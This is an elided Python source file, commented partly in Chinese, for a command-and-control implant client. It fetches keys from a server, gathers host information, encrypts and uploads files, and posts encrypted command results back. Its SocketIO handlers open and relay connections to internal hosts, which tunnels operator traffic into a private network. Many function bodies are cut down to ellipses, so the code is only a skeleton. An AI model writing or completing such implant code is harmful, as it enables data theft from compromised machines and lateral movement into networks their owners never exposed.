...
# Flask应用和SocketIO客户端初始化
app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*")

sio = SocketIOClient(ssl_verify=False)
...
class BaseFunc:
    ...
    def upload_file_to_server(self, filepath):
        ...
        # 加密文件准备
        encrypted_filepath = os.path.join("/tmp", basename(filepath) + ".enc")  # 设置 temp 目录
    ...
    def getbaseinfo(self) -> dict:
        try:
            ...
            s.connect(('8.8.8.8', 80))  # 使用Google的DNS服务器获取本地IP
    ...
    def getkeys(self):
        try:
            ...
            print(f"[ERROR] An error occurred while obtaining the key: {e}")
            return "error", "error"
...
# C2 主循环功能
def c2_main_loop():
    print("[DEBUG] Starting C2 main loop")
    base = BaseFunc()
    ...
    if key == "error" or aes_key == "error":
        print("[ERROR] Failed to get keys, exiting C2 loop")
        return
            ...
            try:
                ...
                if isinstance(rst, dict):
                    ...
                    if isinstance(result, dict):
                        ...
                        encrypted_data = b64encode(DataAesCrypt(aes_key, dumps(result)).encrypt().encode('utf-8')).decode("utf-8")
                        print("加密解密后的数据为", encrypted_data)
                        response = post(
...
@sio.event
def disconnect():
    print("Disconnected from server via SocketIO")
    # 清理内部连接
...
def on_establish_internal_conn(data):
    ...
    try:
        ...
        print(f"[DEBUG] Established internal connection for session {session_id} to {target_host}:{target_port}")
...
def on_data_from_server(data):
    ...
    print("对照表:", session_to_internal_conn)
    if conn:
        try:
            conn.sendall(payload)
            print(f"[DEBUG] Forwarded data to internal connection {session_id}")
        except Exception as e:
            print(f"[ERROR] Failed to send data to internal connection {session_id}: {e}")
...
def read_internal_data(session_id, conn):
    while True:
        try:
            ...
            print(f"[DEBUG] Received data from internal connection {session_id} and forwarded to server")
        except Exception as e:
            print(f"[ERROR] Error reading from internal connection {session_id}: {e}")
            break
    # 连接结束
    # conn.close()
    ...
    #     'payload': b''  # 表示连接结束
    # })
    # print(f"[DEBUG] Internal connection {session_id} closed")
...
def main():
    ...
    # 启动 C2 主循环线程
    c2_thread = threading.Thread(target=c2_main_loop, daemon=True)
    c2_thread.start()
